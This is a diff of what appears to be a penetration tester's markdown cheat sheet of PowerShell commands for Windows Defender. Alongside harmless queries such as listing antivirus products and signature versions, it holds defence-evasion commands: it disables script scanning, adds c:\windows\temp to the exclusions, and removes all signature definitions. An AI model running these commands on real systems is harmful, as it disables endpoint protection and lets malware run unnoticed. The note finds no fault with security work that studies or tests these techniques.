@@ -10,12 +10,15 @@ https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1
 https://wirediver.com/disable-windows-defender-in-powershell/
 ```
 
-
 ## defender - get antivirus
 ```powershell
-wmic.exe /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
-$AVList = @(Get-CimInstance -Namespace 'root/SecurityCenter2' -ClassName 'AntivirusProduct')
+Get-WmiObject -Namespace "root" -Class __Namespace | Select-Object Name
 ```
+## defender - get antivirus
+```powershell
+Get-WmiObject -Namespace root\securitycenter2 -Class antivirusproduct
+```
+
 
 ## defender - get powershell commands
 ```powershell
@@ -94,7 +97,7 @@ Set-MpPreference -DisableScriptScanning $true
 
 ## Defender - Add path to exclusions
 ```powershell
-$p = "<path|c:\windows\temp>" ; Add-MpPreference -ExclusionPath $p -AttackSurfaceReductionOnlyExclusions $p
+$p = @("<path|c:\windows\temp>") ; Add-MpPreference -ExclusionPath $p -AttackSurfaceReductionOnlyExclusions $p
 ```
 
 
@@ -130,8 +133,14 @@ C:\Program Files\Windows Defender\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.
 ```
 
 ## Defender - remove signatures
+blocked byTamper protection (to confirm)
 ```powershell
-C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe -RemoveDefinitions -All
+$env:PATH += ";" + (Get-ChildItem -Path "C:\ProgramData\Microsoft\Windows Defender\Platform" -Directory | Select-Object -First 1).fullname; MpCmdRun.exe -RemoveDefinitions -All
+```
+
+## Defender - Get signatures version
+```powershell
+Get-MpComputerStatus | Select AMEngineVersion, AntiVirusSignatureVersion, AntiSpywareSignatureVersion
 ```
 
 ## Defender - scan folder (or file)
